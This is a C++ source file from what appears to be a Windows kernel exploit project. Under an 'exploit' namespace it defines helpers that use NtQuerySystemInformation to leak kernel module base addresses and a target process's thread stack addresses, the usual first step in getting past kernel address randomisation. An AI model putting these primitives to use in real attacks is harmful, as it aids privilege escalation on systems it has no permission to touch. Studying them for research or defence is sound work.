#include "include/common/memtools.hpp"

namespace exploit
{
    namespace memtools
    {
        unsigned long long ulGetKernelBase(const PCHAR ModuleName) {
            PVOID kernelImageBase = NULL;
            PCHAR kernelImage = NULL;


            //import function `NtQuerySystemInformation`
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (NtQuerySystemInformation == NULL) {
                printf("[!] GetProcAddress() failed.\n");
                return 0;
            }

            //init length
            ULONG len = 0;
            NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
            //init module infomations
            PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
            if (pModuleInfo == NULL) {
                printf("[!] [ulGetKernelBase]  Could not allocate memory for module info.\n");
                return 0;
            }

            //starting quering
            NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

            if (status != (NTSTATUS)0x0) {
                printf("[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 0;
            }
            for (unsigned int i = 0; i < pModuleInfo->ModulesCount; i++) {
                kernelImage = (PCHAR)pModuleInfo->Modules[i].Name;
                if (strstr(kernelImage, ModuleName)) {
                    kernelImageBase = pModuleInfo->Modules[i].ImageBaseAddress;
                    printf("[*] [ulGetKernelBase]  Mod name %s ", kernelImage);
                    printf(" Base Addr 0x%llx\r\n", kernelImageBase);

                    return (unsigned long long)kernelImageBase;
                }
            }
            return 0;
        }

        unsigned long long ulGetStackLimit(LPCWSTR ProcessName) {
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (query == NULL) {
                printf("GetProcAddress() failed.\n");
                return 1;
            }
            ULONG len = 2000;
            NTSTATUS status = NULL;
            PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
            do {
                len *= 2;
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
                status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
            } while (status == (NTSTATUS)0xc0000004);
            if (status != (NTSTATUS)0x0) {
                printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 1;
            }

            while (pProcessInfo->NextEntryOffset != NULL) {
                if (pProcessInfo->ImageName.Buffer) {
                    if (wcsstr(pProcessInfo->ImageName.Buffer, ProcessName)) {
                        for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                            PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                            PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
                            printf("Stack base 0x%llx\t", stackBase);
                            printf("Stack limit 0x%llx\r\n", stackLimit);

                        }
                        break;
                    }
                }
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
            }
            return 0;
        }

        unsigned long long ulGetStackLimitWithInfo(pStackInfo stackinfo) {
            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
            PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
            if (query == NULL) {
                printf("GetProcAddress() failed.\n");
                return 1;
            }
            ULONG len = 2000;
            NTSTATUS status = NULL;
            PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
            do {
                len *= 2;
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
                status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
            } while (status == (NTSTATUS)0xc0000004);
            if (status != (NTSTATUS)0x0) {
                printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
                return 1;
            }

            while (pProcessInfo->NextEntryOffset != NULL) {
                if (pProcessInfo->ImageName.Buffer) {
                    if (wcsstr(pProcessInfo->ImageName.Buffer, stackinfo->ModuleName)) {
                        for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                            PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                            PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
                            stackinfo->result = (unsigned long long)stackBase;
                            printf("Stack base 0x%llx\t", stackBase);
                            printf("Stack limit 0x%llx\r\n", stackLimit);
                            break;
                        }
                    }
                }
                pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
            }
            return 0;
        }

        unsigned long long ulUseStackInfo(wchar_t ProcName[]) {
            pStackInfo stackinfo = (pStackInfo)malloc(sizeof(StackInfo));
            if (stackinfo == NULL) {
                printf("[!] Can't allocate memory\n");
                return 0;
            }
            stackinfo->ModuleName = ProcName;
            stackinfo->result = 0;
            HANDLE hThread = CreateThread(NULL, 0x100, (LPTHREAD_START_ROUTINE)ulGetStackLimitWithInfo, stackinfo, NULL, NULL);
            if (hThread == NULL) {
                printf("[!] Can't get thread\n");
                return 0;
            }
            system("pause");
            WaitForSingleObject(hThread, INFINITE);
            unsigned long long baseaddr = stackinfo->result;
            CloseHandle(hThread);
            free(stackinfo);
            return baseaddr;
        }
    } // namespace memtools

} // namespace exploit